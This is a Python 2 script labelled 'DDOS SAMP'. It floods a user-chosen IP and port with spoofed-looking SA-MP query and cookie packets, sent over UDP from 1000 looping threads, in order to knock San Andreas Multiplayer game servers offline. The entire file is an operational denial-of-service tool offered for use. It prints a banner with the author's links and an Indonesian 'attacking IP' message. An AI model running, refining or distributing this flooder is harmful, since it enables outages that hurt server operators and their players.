import socket
import struct
import codecs,sys
import threading
import random
import time
import os


os.system("clear");
print
print "===================================================================="
print "|Author     : Nicholas Developer                                   |"
print "|Name Tools : DDOS SAMP                                            |"
print "|Github     : https://github.com/NicholasDevelopers.               |"
print "|Youtube    : https://youtube.com/channel/UCA6jbbAO29pYFP4QUqMBpmQ |"
print "|Note       : CTRL+Z For Stop It.                                  |"
print "|==================================================================="
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

orgip =ip

xnxx = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]


print("Menyerang IP : %s Dengan Port %s"%(orgip,port))

            





class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
                
                msg = xnxx[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(xnxx[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(xnxx[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(xnxx[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(xnxx[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(1000):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
         print('#########################################################################')
         print('STOP ATTACK')
         print('#########################################################################')
         print('\n\n')
         print('{}'.format(orgip))
         pass
